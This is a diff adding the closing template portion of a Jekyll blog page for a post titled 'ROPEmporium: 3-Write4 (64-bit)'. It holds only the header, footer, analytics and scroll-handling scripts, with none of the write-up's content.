+        </div>
+    </div>
+</aside>
+
+<!-- Floating header which appears on-scroll, included from includes/floating-header.hbs -->
+<div class="floating-header">
+    <div class="floating-header-logo">
+        <a href="/">
+            
+                <img src="/assets/images/static/blog-icon.png" alt="Securityits.io icon" />
+            
+            <span>Securityits.io</span>
+        </a>
+    </div>
+    <span class="floating-header-divider">&mdash;</span>
+    <div class="floating-header-title">ROPEmporium: 3-Write4 (64-bit)</div>
+    <div class="floating-header-share">
+        <div class="floating-header-share-label">Share this <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+    <path d="M7.5 15.5V4a1.5 1.5 0 1 1 3 0v4.5h2a1 1 0 0 1 1 1h2a1 1 0 0 1 1 1H18a1.5 1.5 0 0 1 1.5 1.5v3.099c0 .929-.13 1.854-.385 2.748L17.5 23.5h-9c-1.5-2-5.417-8.673-5.417-8.673a1.2 1.2 0 0 1 1.76-1.605L7.5 15.5zm6-6v2m-3-3.5v3.5m6-1v2"/>
+</svg>
+</div>
+        <a class="floating-header-share-tw" href="https://twitter.com/share?text=ROPEmporium%3A+3-Write4+%2864-bit%29&amp;url=https://jekyllt.github.io/jasper2/ropemporium-3-write4"
+            onclick="window.open(this.href, 'share-twitter', 'width=550,height=235');return false;">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32"><path d="M30.063 7.313c-.813 1.125-1.75 2.125-2.875 2.938v.75c0 1.563-.188 3.125-.688 4.625a15.088 15.088 0 0 1-2.063 4.438c-.875 1.438-2 2.688-3.25 3.813a15.015 15.015 0 0 1-4.625 2.563c-1.813.688-3.75 1-5.75 1-3.25 0-6.188-.875-8.875-2.625.438.063.875.125 1.375.125 2.688 0 5.063-.875 7.188-2.5-1.25 0-2.375-.375-3.375-1.125s-1.688-1.688-2.063-2.875c.438.063.813.125 1.125.125.5 0 1-.063 1.5-.25-1.313-.25-2.438-.938-3.313-1.938a5.673 5.673 0 0 1-1.313-3.688v-.063c.813.438 1.688.688 2.625.688a5.228 5.228 0 0 1-1.875-2c-.5-.875-.688-1.813-.688-2.75 0-1.063.25-2.063.75-2.938 1.438 1.75 3.188 3.188 5.25 4.25s4.313 1.688 6.688 1.813a5.579 5.579 0 0 1 1.5-5.438c1.125-1.125 2.5-1.688 4.125-1.688s3.063.625 4.188 1.813a11.48 11.48 0 0 0 3.688-1.375c-.438 1.375-1.313 2.438-2.563 3.188 1.125-.125 2.188-.438 3.313-.875z"/></svg>
+
+        </a>
+        <a class="floating-header-share-fb" href="https://www.facebook.com/sharer/sharer.php?u=https://jekyllt.github.io/jasper2/ropemporium-3-write4"
+            onclick="window.open(this.href, 'share-facebook','width=580,height=296');return false;">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32"><path d="M19 6h5V0h-5c-3.86 0-7 3.14-7 7v3H8v6h4v16h6V16h5l1-6h-6V7c0-.542.458-1 1-1z"/></svg>
+
+        </a>
+    </div>
+    <progress class="progress" value="0">
+        <div class="progress-container">
+            <span class="progress-bar"></span>
+        </div>
+    </progress>
+</div>
+
+
+<!-- /post -->
+
+<!-- The #contentFor helper here will send everything inside it up to the matching #block helper found in default.hbs -->
+
+
+        <!-- Previous/next page links - displayed on every page -->
+        
+
+        <!-- The footer at the very bottom of the screen -->
+        <footer class="site-footer outer">
+            <div class="site-footer-content inner">
+                <section class="copyright"><a href="/">Securityits.io</a> &copy; 2025</section>
+                <section class="poweredby">Proudly published with <a href="https://jekyllrb.com/">Jekyll</a> &
+                    <a href="https://pages.github.com/" target="_blank" rel="noopener">GitHub Pages</a> using
+                    <a href="https://github.com/jekyllt/jasper2" target="_blank" rel="noopener">Jasper2</a></section>
+                <nav class="site-footer-nav">
+                    <a href="/">Latest Posts</a>
+                    
+                    <a href="https://twitter.com/Securitybits_io" target="_blank" rel="noopener">Twitter</a>
+                    <a href="https://ghost.org" target="_blank" rel="noopener">Ghost</a>
+                </nav>
+            </div>
+        </footer>
+
+    </div>
+
+    <!-- The big email subscribe modal content -->
+    
+
+    <!-- highlight.js -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.10.0/components/prism-abap.min.js"></script>
+    <script>$(document).ready(function() {
+      $('pre code').each(function(i, block) {
+        hljs.highlightBlock(block);
+      });
+    });</script>
+
+    <!-- jQuery + Fitvids, which makes all video embeds responsive -->
+    <script
+        src="https://code.jquery.com/jquery-3.2.1.min.js"
+        integrity="sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4="
+        crossorigin="anonymous">
+    </script>
+    <script type="text/javascript" src="/assets/js/jquery.fitvids.js"></script>
+    <script type="text/javascript" src="https://demo.ghost.io/assets/js/jquery.fitvids.js?v=724281a32e"></script>
+
+
+    <!-- Paginator increased to "infinit" in _config.yml -->
+    <!-- if paginator.posts  -->
+    <!-- <script>
+        var maxPages = parseInt('');
+    </script>
+    <script src="/assets/js/infinitescroll.js"></script> -->
+    <!-- /endif -->
+
+    
+
+
+    <!-- Add Google Analytics  -->
+    <!-- Google Analytics Tracking code -->
+ <script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+  ga('create', 'UA-115328400-1', 'auto');
+  ga('send', 'pageview');
+
+ </script>
+
+
+    <!-- The #block helper will pull in data from the #contentFor other template files. In this case, there's some JavaScript which we only want to use in post.hbs, but it needs to be included down here, after jQuery has already loaded. -->
+    
+        <script>
+
+// NOTE: Scroll performance is poor in Safari
+// - this appears to be due to the events firing much more slowly in Safari.
+//   Dropping the scroll event and using only a raf loop results in smoother
+//   scrolling but continuous processing even when not scrolling
+$(document).ready(function () {
+    // Start fitVids
+    var $postContent = $(".post-full-content");
+    $postContent.fitVids();
+    // End fitVids
+
+    var progressBar = document.querySelector('progress');
+    var header = document.querySelector('.floating-header');
+    var title = document.querySelector('.post-full-title');
+
+    var lastScrollY = window.scrollY;
+    var lastWindowHeight = window.innerHeight;
+    var lastDocumentHeight = $(document).height();
+    var ticking = false;
+
+    function onScroll() {
+        lastScrollY = window.scrollY;
+        requestTick();
+    }
+
+    function onResize() {
+        lastWindowHeight = window.innerHeight;
+        lastDocumentHeight = $(document).height();
+        requestTick();
+    }
+
+    function requestTick() {
+        if (!ticking) {
+            requestAnimationFrame(update);
+        }
+        ticking = true;
+    }
+
+    function update() {
+        var trigger = title.getBoundingClientRect().top + window.scrollY;
+        var triggerOffset = title.offsetHeight + 35;
+        var progressMax = lastDocumentHeight - lastWindowHeight;
+
+        // show/hide floating header
+        if (lastScrollY >= trigger + triggerOffset) {
+            header.classList.add('floating-active');
+        } else {
+            header.classList.remove('floating-active');
+        }
+
+        progressBar.setAttribute('max', progressMax);
+        progressBar.setAttribute('value', lastScrollY);
+
+        ticking = false;
+    }
+
+    window.addEventListener('scroll', onScroll, {passive: true});
+    window.addEventListener('resize', onResize, false);
+
+    update();
+});
+</script>
+
+    
+
+    <!-- Ghost outputs important scripts and data with this tag - it should always be the very last thing before the closing body tag -->
+    <!-- ghost_foot -->
+
+</body>
+</html>
